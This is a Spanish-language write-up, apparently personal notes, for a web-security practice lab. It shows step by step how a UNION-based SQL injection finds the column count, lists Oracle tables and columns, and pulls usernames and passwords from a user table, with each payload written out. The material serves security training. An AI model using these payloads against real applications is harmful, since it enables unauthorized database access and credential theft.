Tenemos el siguiente laboratorio:
![[Pasted image 20240517093647.png]]
Lo primero será evaluar el número de columnas, donde vemos que hay 2:
```bash
Lifestyle'+UNION+SELECT+'NULL','NULL'+FROM+dual
```
![[Pasted image 20240517093848.png]]
Ahora, para conocer el nombre de las tablas, usamos la siguiente query:
```bash
Lifestyle'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
![[Pasted image 20240517093932.png]]
Si miramos el código fuente, vemos una tabla de usuarios:
![[Pasted image 20240517094906.png]]
Ahora, vemos la tabla USERS_MWEPIF, la cual puede ser interesante, por lo que usamos el siguiente payload para acceder a su información:
```bash
Lifestyle'UNION+SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_MWEPIF'-- -
```
Y habremos obtenido las credenciales:
```bash
PASSWORD_SJGWAQ
USERNAME_IBGKKV
```
![[Pasted image 20240517095340.png]]
Para ver las credenciales de los usuarios, usamos la siguiente consulta utilizando la información obtenida anteriormente:
```bash
Lifestyle'UNION+SELECT USERNAME_IBGKKV, PASSWORD_SJGWAQ FROM USERS_MWEPIF-- -
```
![[Pasted image 20240517095640.png]]
Y ya habremos resuelto el laboratorio:
![[Pasted image 20240517095704.png]]
